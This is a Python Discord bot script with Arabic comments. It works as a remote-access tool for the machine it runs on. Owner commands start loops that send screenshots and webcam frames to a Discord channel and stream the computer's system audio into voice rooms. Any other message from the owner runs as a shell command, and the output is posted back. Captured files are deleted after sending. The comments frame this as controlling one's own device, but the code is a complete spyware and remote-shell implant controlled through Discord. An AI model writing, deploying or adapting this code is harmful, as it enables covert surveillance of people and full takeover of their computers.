import os, asyncio, io, subprocess, tempfile, time
import discord
from discord.ext import commands
import pyautogui
import cv2
import numpy as np
import soundfile as sf

TOKEN = os.environ["DISCORD_TOKEN"]
OWNER_ID = 1195420977799123115  # غيّره

intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True
bot = commands.Bot(command_prefix="", intents=intents)

ss_task = None
cam_task = None
spam_task = None
voice_client = None

# ===== حماية =====
@bot.check
async def only_owner(ctx):
    return ctx.author.id == OWNER_ID

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    print(f"❌ {type(error).__name__}: {error}")

# ==================================================
# 📸 سكرين شوت — يحذف الملف من جهازك بعد الإرسال
# ==================================================
async def screenshot_loop(ctx, interval):
    while True:
        tmp_path = None
        try:
            # احفظ الصورة في ملف مؤقت على جهازك
            fd, tmp_path = tempfile.mkstemp(suffix=".png")
            os.close(fd)
            pyautogui.screenshot().save(tmp_path, format="PNG")

            # أرسلها لديسكورد
            await ctx.send(file=discord.File(tmp_path, "screenshot.png"))

            # احذفها من جهازك فوراً بعد الإرسال
            try:
                os.remove(tmp_path)
            except:
                pass
            tmp_path = None

            await asyncio.sleep(interval)
        except asyncio.CancelledError:
            if tmp_path and os.path.exists(tmp_path):
                try: os.remove(tmp_path)
                except: pass
            break
        except Exception as e:
            print(f"خطأ سكرين: {e}")
            if tmp_path and os.path.exists(tmp_path):
                try: os.remove(tmp_path)
                except: pass
            await asyncio.sleep(interval)

@bot.command(name="ir")
async def ir_cmd(ctx, interval: float = 2.0):
    global ss_task
    if ss_task and not ss_task.done():
        return await ctx.send("⚠️ شغال، اكتب `stopir`")
    ss_task = asyncio.create_task(screenshot_loop(ctx, interval))
    await ctx.send(f"📸 بدأ كل {interval} ثانية. `stopir`")

@bot.command(name="stopir")
async def stopir_cmd(ctx):
    global ss_task
    if not ss_task or ss_task.done():
        return await ctx.send("مو شغال")
    ss_task.cancel()
    ss_task = None
    await ctx.send("🛑 وقف")

# ==================================================
# 📷 كاميرا
# ==================================================
async def camera_loop(ctx, interval, cam_index=0):
    cap = cv2.VideoCapture(cam_index)
    if not cap.isOpened():
        return await ctx.send("❌ ما فتحت الكاميرا")
    try:
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            tmp_path = None
            try:
                fd, tmp_path = tempfile.mkstemp(suffix=".jpg")
                os.close(fd)
                cv2.imwrite(tmp_path, frame)
                await ctx.send(file=discord.File(tmp_path, "cam.jpg"))
                try: os.remove(tmp_path)
                except: pass
            except Exception as e:
                print(f"خطأ كاميرا: {e}")
                if tmp_path and os.path.exists(tmp_path):
                    try: os.remove(tmp_path)
                    except: pass
            await asyncio.sleep(interval)
    except asyncio.CancelledError:
        pass
    finally:
        cap.release()

@bot.command(name="cam")
async def cam_cmd(ctx, interval: float = 2.0, cam_index: int = 0):
    global cam_task
    if cam_task and not cam_task.done():
        return await ctx.send("⚠️ الكاميرا شغالة، اكتب `stopcam`")
    cam_task = asyncio.create_task(camera_loop(ctx, interval, cam_index))
    await ctx.send(f"📷 بدأت كل {interval} ثانية. `stopcam`")

@bot.command(name="stopcam")
async def stopcam_cmd(ctx):
    global cam_task
    if not cam_task or cam_task.done():
        return await ctx.send("مو شغالة")
    cam_task.cancel()
    cam_task = None
    await ctx.send("🛑 وقفت")

# ==================================================
# 🔊 تسجيل سبيكر جهازك (loopback)
# ==================================================
def record_system_audio(seconds, samplerate=48000):
    """تسجيل صوت سبيكر جهازك (اللي يطلع من السماعة)"""
    import soundcard as sc
    speaker = sc.default_speaker()
    loopback = sc.get_microphone(id=str(speaker.name), include_loopback=True)
    with loopback.recorder(samplerate=samplerate) as rec:
        data = rec.record(int(seconds * samplerate))
    return (data * 32767).astype(np.int16)

def write_wav_file(audio_data, path, samplerate=48000):
    sf.write(path, audio_data, samplerate, format='WAV')

# ==================================================
# 🎙️ join — البوت يدخل روم ويبث سبيكر جهازك
# ==================================================
@bot.command(name="join")
async def join_cmd(ctx, *, room_name: str = None):
    """join [اسم الروم] — البوت يدخل الروم ويبث صوت سبيكر جهازك"""
    global voice_client

    # لو ما حدد روم، خذ روم المتصل فيه صاحب الأمر
    if room_name is None:
        if not ctx.author.voice:
            return await ctx.send("❌ اكتب اسم الروم، أو ادخل روم صوتي أول")
        channel = ctx.author.voice.channel
    else:
        channel = discord.utils.get(ctx.guild.voice_channels, name=room_name)
        if not channel:
            return await ctx.send(f"❌ ما لقيت روم اسمه `{room_name}`")

    if voice_client and voice_client.is_connected():
        await voice_client.move_to(channel)
    else:
        voice_client = await channel.connect()

    await ctx.send(f"✅ دخلت روم `{channel.name}` — الجوّال يبث سبيكر جهازي الحين")

@bot.command(name="leave")
async def leave_cmd(ctx):
    global voice_client, spam_task
    if spam_task and not spam_task.done():
        spam_task.cancel()
        spam_task = None
    if voice_client and voice_client.is_connected():
        await voice_client.disconnect()
        voice_client = None
        await ctx.send("👋 طلعت")
    else:
        await ctx.send("مو في روم")

# ==================================================
# 🔁 spam — بث مستمر لصوت سبيكر جهازك بشكل مقاطع متتابعة
# ==================================================
async def play_audio_file(vc, path):
    """يشغل ملف WAV وينتظر لين يخلص"""
    done = asyncio.Event()

    def after(err):
        if err:
            print(f"خطأ تشغيل: {err}")
        bot.loop.call_soon_threadsafe(done.set)

    source = discord.FFmpegPCMAudio(path, pipe=False)
    vc.play(source, after=after)
    await done.wait()

async def spam_loop(ctx, chunk_seconds):
    """تسجيل مستمر مقاطع chunk_seconds وتشغيلها بشكل متتابع"""
    global voice_client
    segment = 0
    while True:
        if not voice_client or not voice_client.is_connected():
            await ctx.send("❌ البوت طلع من الروم")
            break

        tmp_path = None
        try:
            # سجل مقطع من سبيكر جهازك
            audio = await asyncio.to_thread(record_system_audio, chunk_seconds)

            fd, tmp_path = tempfile.mkstemp(suffix=".wav")
            os.close(fd)
            await asyncio.to_thread(write_wav_file, audio, tmp_path)

            # شغله في الروم
            await play_audio_file(voice_client, tmp_path)

            # احذف الملف من جهازك
            try: os.remove(tmp_path)
            except: pass
            tmp_path = None

            segment += 1
        except asyncio.CancelledError:
            if tmp_path and os.path.exists(tmp_path):
                try: os.remove(tmp_path)
                except: pass
            break
        except Exception as e:
            print(f"خطأ سبام: {e}")
            if tmp_path and os.path.exists(tmp_path):
                try: os.remove(tmp_path)
                except: pass
            await asyncio.sleep(1)

@bot.command(name="spam")
async def spam_cmd(ctx, chunk_seconds: float = 10.0):
    """spam [طول المقطع بالثواني] — بث مستمر لصوت سبيكر جهازك"""
    global spam_task
    if not voice_client or not voice_client.is_connected():
        return await ctx.send("❌ اكتب `join` أول")
    if spam_task and not spam_task.done():
        return await ctx.send("⚠️ شغال، اكتب `stopspam`")
    spam_task = asyncio.create_task(spam_loop(ctx, chunk_seconds))
    await ctx.send(f"🔊 بدأ البث المستمر (مقاطع {chunk_seconds} ثانية). `stopspam` للإيقاف")

@bot.command(name="stopspam")
async def stopspam_cmd(ctx):
    global spam_task, voice_client
    if not spam_task or spam_task.done():
        return await ctx.send("مو شغال")
    spam_task.cancel()
    spam_task = None
    if voice_client and voice_client.is_playing():
        voice_client.stop()
    await ctx.send("🛑 وقف البث")

# ==================================================
# 💻 أوامر CMD بدون !
# ==================================================
@bot.event
async def on_message(message):
    if message.author.bot:
        return
    if message.author.id != OWNER_ID:
        return

    content = message.content.strip()
    if not content:
        return

    first_word = content.split()[0]
    if first_word in [c.name for c in bot.commands]:
        await bot.process_commands(message)
        return

    # نفذ كأمر CMD
    try:
        result = subprocess.run(
            content, shell=True, capture_output=True, text=True,
            timeout=30, cwd=os.getcwd()
        )
        output = result.stdout or result.stderr or "(ما فيه ناتج)"
    except subprocess.TimeoutExpired:
        output = "⏱️ الأمر أخذ وقت طويل"
    except Exception as e:
        output = f"❌ خطأ: {e}"

    max_len = 1900
    if len(output) <= max_len:
        await message.channel.send(f"```\n{output}\n```")
    else:
        for i in range(0, len(output), max_len):
            await message.channel.send(f"```\n{output[i:i+max_len]}\n```")

    await bot.process_commands(message)

bot.run(TOKEN)